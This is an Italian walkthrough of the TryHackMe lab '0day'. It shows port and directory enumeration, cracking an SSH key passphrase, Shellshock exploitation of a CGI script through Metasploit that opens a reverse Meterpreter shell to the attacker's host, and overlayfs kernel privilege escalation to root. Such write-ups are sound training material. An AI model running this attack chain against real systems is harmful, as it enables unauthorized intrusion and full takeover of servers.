---
title: "0day"
description: "CTF Writeup - 0day (TryHackMe)"
---

# 0day

Iniziamo come di consueto a enumerare i servizi aperti nella macchina

```bash
kali@kali:~/Desktop/CTF/0day$ sudo nmap -sS -sV -sC -p- 0day.local -oN nmap.txt           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-30 17:07 -0400
Nmap scan report for 0day.local (10.129.162.255)
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

| Servizio e porta | Versione | Note |
| --- | --- | --- |
| ssh (22) | OpenSSH 6.6.1p1 | - |
| http (80) | Apache httpd 2.4.7 | - |

Eseguendo l’enumerazione delle pagine web disponibili otteniamo

```bash
                                                                                                                                                                                                                  
kali@kali:~/Desktop/CTF/0day$ ffuf -u http://0day.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak -c

admin                   [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 58ms]
backup                  [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 61ms]
cgi-bin/                [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 61ms]
cgi-bin                 [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 63ms]
css                     [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 58ms]
img                     [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 59ms]
index.html              [Status: 200, Size: 3025, Words: 285, Lines: 43, Duration: 59ms]
js                      [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 58ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 57ms]
robots.txt              [Status: 200, Size: 38, Words: 7, Lines: 2, Duration: 58ms]
secret                  [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 58ms]
server-status           [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 58ms]
uploads                 [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 59ms]
:: Progress: [19000/19000] :: Job [1/1] :: 666 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

Andando subito su `/backup/` vediamo salvato subito una chiave RSA

![image.png](0day.md)

Ma è protetta da password

```bash
kali@kali:~/Desktop/CTF/0day$ openssl rsa -in backup.key.fixed -check -noout
Enter pass phrase for backup.key.fixed:
```

ma grazie ad alcuni tool come `John The Ripper` posso cercarla

```bash
kali@kali:~/Desktop/CTF/0day$ ssh2john backup.key > hash.txt 
                                                                                                                                                                                                                  
kali@kali:~/Desktop/CTF/0day$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (backup.key)     
1g 0:00:00:00 DONE (2026-10-30 17:23) 6.250g/s 3200p/s 3200c/s 3200C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Trovando la password della chiave `letmein` 

```bash
kali@kali:~/Desktop/CTF/0day$ openssl rsa -in backup.key -check -noout 
Enter pass phrase for backup.key:
RSA key ok
```

Cercando per la versione di OpenSSH del server troviamo diverse vulnerabilità **CVE-2018-15473**

```bash
kali@kali:~/Desktop/CTF/0day$ searchsploit openssh 6.6.1 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                        | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                  | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                            | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                        | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                            | linux/remote/45939.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Come prima cosa sapendo che io ho già una **chiave di accesso** ma non conosco ancora l’utente a cui appartiene, mi verrebbe da prendere in considerazione come prima vulnerabilità una delle tre **User Enumeration.** Il problema di questi script è che sono vecchi e scritti per python2, ho provato a convertirli con `2to3` ma da continuamente errore. Quindi decido di muovermi con **metasploit**

```bash
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 10.129.162.255:22 - SSH - Using malformed packet technique
[*] 10.129.162.255:22 - SSH - Checking for false positives
[-] 10.129.162.255:22 - SSH - throws false positive results. Aborting.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Sembra non essere davvero vulnerabile, strada sbagliata…

Continuiamo ad esplorare il sito web e in particolare la cartella `cgi-bin` ed eseguiamo una scansione sotto questa cartella

```bash
kali@kali:~/Desktop/CTF/0day$ gobuster dir -u http://0day.local/cgi-bin/ \                                                                       
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x cgi,sh,pl
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://0day.local/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              cgi,sh,pl
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.sh              (Status: 403) [Size: 292]
.htaccess.cgi        (Status: 403) [Size: 298]
.htaccess.sh         (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 294]
.hta.pl              (Status: 403) [Size: 292]
.htaccess.pl         (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 289]
.hta.cgi             (Status: 403) [Size: 293]
.htpasswd            (Status: 403) [Size: 294]
.htpasswd.cgi        (Status: 403) [Size: 298]
.htpasswd.pl         (Status: 403) [Size: 297]
.htpasswd.sh         (Status: 403) [Size: 297]
test.cgi             (Status: 200) [Size: 13]
Progress: 19000 / 19000 (100.00%)

```

C’è un file `test.cgi` controlliamolo e vediamo se è vulnerabile a `Shellshock` 

```bash
kali@kali:~/Desktop/CTF/0day$ curl -i http://0day.local/cgi-bin/test.cgi
HTTP/1.1 200 OK
Date: Fri, 30 Oct 2026 22:05:37 GMT
Server: Apache/2.4.7 (Ubuntu)
Content-Length: 13
Content-Type: text/html

Hello World!
                                                                                                                                                                                                                  
kali@kali:~/Desktop/CTF/0day$ nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi 0day.local
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-30 18:06 -0400
Nmap scan report for 0day.local (10.129.162.255)
Host is up (0.059s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds

```

E’ vulnerabile!!

Il server espone un endpoint CGI (`/cgi-bin/test.cgi`) che restituisce correttamente una risposta HTTP. Tramite Nmap è stata individuata una possibile vulnerabilità **Shellshock (CVE-2014-6271)**.

Shellshock è una vulnerabilità presente in alcune versioni di Bash che permette l'esecuzione di comandi arbitrari attraverso variabili d'ambiente appositamente manipolate. Nel contesto CGI, alcune informazioni contenute negli header HTTP vengono passate agli script come variabili d'ambiente, creando un possibile vettore di Remote Code Execution (RCE). 

Apriamo quindi **metasploit** con `msfconsole` e carichiamo il modulo `exploit/multi/http/apache_mod_cgi_bash_env_exec`

```bash
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 0day.local
RHOSTS => 0day.local
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
TARGETURI => /cgi-bin/test.cgi
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.131.79
LHOST => 192.168.131.79
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
[*] Started reverse TCP handler on 192.168.131.79:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1079144 bytes) to 10.129.162.255
[*] Meterpreter session 1 opened (192.168.131.79:4444 -> 10.129.162.255:43613) at 2026-10-30 18:16:48 -0400

meterpreter > 

```

Abbiamo ottenuto la shell come `www-data`!

Otteniamo la prima flag:

```bash
www-data@ubuntu:/tmp$ cd /home
www-data@ubuntu:/home$ ls
ryan
www-data@ubuntu:/home$ cd ryan/
www-data@ubuntu:/home/ryan$ ls
user.txt
www-data@ubuntu:/home/ryan$ cat user.txt 
THM{********_*****}

```

Ora dobbiamo fare privileage escaltion. Guardando la versione del kernel scopriamo che è `Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux`
Che è vulnerabile alla https://ubuntu.com/security/CVE-2015-1328 usando la sessione precedente di **metasploit** mettiamo in background il **meterpreter attuale** con background.

E cerchiamo il nuovo exploit per la versione del kernel 3.13

```bash
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > search CVE-2015-1328

Matching Modules
================

   #  Full Name                               Disclosure Date  Rank  Check  Name
   -  ---------                               ---------------  ----  -----  ----
   0  exploit/linux/local/overlayfs_priv_esc  2015-06-16       good  Yes    Overlayfs Privilege Escalation
   1    \_ target: CVE-2015-1328              .                .     .      .
   2    \_ target: CVE-2015-8660              .                .     .      .

Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/local/overlayfs_priv_esc
After interacting with a module you can manually set a TARGET with set TARGET 'CVE-2015-8660'

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > use 1
msf exploit(linux/local/overlayfs_priv_esc) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         meterpreter x86/linux  www-data @ ubuntu  192.168.131.79:4444 -> 10.129.162.255:43622 (10.129.162.255)

msf exploit(linux/local/overlayfs_priv_esc) > set SESSION 1
SESSION => 1
msf exploit(linux/local/overlayfs_priv_esc) > set LPORT 4446
LPORT => 4446
msf exploit(linux/local/overlayfs_priv_esc) > set LHOST 192.168.131.79
LHOST => 192.168.131.79
msf exploit(linux/local/overlayfs_priv_esc) > exploit
[*] Started reverse TCP handler on 192.168.131.79:4446 
[*] Writing to /tmp/DtePGcSh (13655 bytes)
[*] Writing to /tmp/ofs-lib.so (7752 bytes)
[*] Writing to /tmp/lXqzVpYN (207 bytes)
[*] Sending stage (36 bytes) to 10.129.162.255
[+] Deleted /tmp/DtePGcSh
[+] Deleted /tmp/lXqzVpYN
[*] Command shell session 2 opened (192.168.131.79:4446 -> 10.129.162.255:48503) at 2026-10-30 18:44:50 -0400

# whoami
root

```

E otteniamo l’ultima key

```bash
# cd /root
# ls
root.txt
# cat root.txt
THM{*******************************}
# 
```